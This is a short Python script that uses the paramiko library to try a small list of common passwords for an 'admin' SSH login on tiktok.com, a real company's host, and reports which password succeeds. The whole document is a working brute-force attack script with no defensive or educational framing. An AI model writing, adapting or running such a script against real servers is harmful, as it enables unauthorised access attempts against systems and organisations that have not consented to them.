import paramiko

hostname = 'tiktok.com'
username = 'admin'
password_list = ['password1', '123456', 'admin123']

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in password_list:
    try:
        client.connect(hostname, username=username, password=password, timeout=3)
        print(f'Success! Password: {password}')
        break
    except paramiko.AuthenticationException:
        print(f'Failed: {password}')
    except Exception as e:
        print(f'Error: {str(e)}')

